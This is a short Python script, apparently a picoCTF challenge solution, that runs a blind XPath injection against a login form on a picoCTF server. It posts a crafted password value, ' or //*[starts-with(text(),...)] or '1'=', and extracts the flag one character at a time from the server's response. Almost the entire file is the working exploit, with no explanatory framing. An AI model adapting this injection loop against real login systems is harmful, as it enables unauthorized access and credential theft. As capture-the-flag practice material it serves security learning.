import requests
from string import *

charecters = ascii_lowercase + ascii_uppercase + digits+"}_"
print(charecters)

seen_password = ["picoCTF{"]
while True:

    for ch in charecters:
        print(f"trying {''.join(seen_password)+ch}")
        st = ''.join(seen_password)+ch
        data = {"name":"admin", "pass":f"' or //*[starts-with(text(),'{st}')] or '1'='"}
        r = requests.post("http://mercury.picoctf.net:59946/", data=data)

        content = r.text
        if "You&#39;re on the right path." in content:
            seen_password.append(ch)
            break
